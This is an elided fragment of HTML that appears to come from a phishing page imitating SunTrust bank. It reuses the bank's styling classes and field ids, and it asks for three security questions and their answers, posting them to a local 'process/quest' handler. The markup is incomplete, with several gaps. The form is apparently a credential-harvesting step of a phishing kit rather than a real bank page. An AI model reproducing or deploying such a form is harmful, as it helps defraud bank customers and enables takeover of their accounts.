...
<div id="page-container" class="page-container">
    <div class="centered-content clearfix">
        <form action="process/quest" method="post" class="unauth-form jqtransform js-login-form">
                            ...
                            <div class="unauth-form__rowgroup -visible" id="unauth-ic-form-rowgroup-account-info" style="display: block;">
                                 <div class="row">
                                        <div class="col-25">
                                          <label for="em"><strong>Security Question 1</strong></label>
                                            ...
                                            <select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="quest1" aria-required style="width: 100%; outline: none; height: 50" required="">
                                          ...
                                          <div class="col-75">
                                           ...
                                           <div>
                                        <input name="ans1" placeholder="XXXX" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="124" autocomplete="off" required=""> 
                                     </div>
                                    ...
                                    <div class="col-25">
                                        ...
                                        <div>
                                            <select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="quest2" aria-required style="width: 100%; outline: none; height: 50" required="">
                                              <option value="" disabled="" selected="selected">Choose Your Question </option>
                                ...
                                <div class="col-75">
                                   <label for="em"><strong>Answer 2</strong></label>
                                     <div>
                                        <input name="ans2" placeholder="XXXX" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="124" autocomplete="off" required=""> 
                                    </div>
                                </div>
                                ...
                                <div class="col-25">
                                        ...
                                        <div>
                                            <select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="quest3" aria-required style="width: 100%; outline: none; height: 50" required="">
                                                <option value="" disabled="" selected="selected">Choose Your Question </option>
                                ...
                                <div class="col-75">
                                   <label for="em"><strong>Answer 3</strong></label>
                                     <div>
                                        <input name="ans3" placeholder="XXXX" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" maxlength="124" autocomplete="off" required=""> 
                                    </div>
                                  <br>
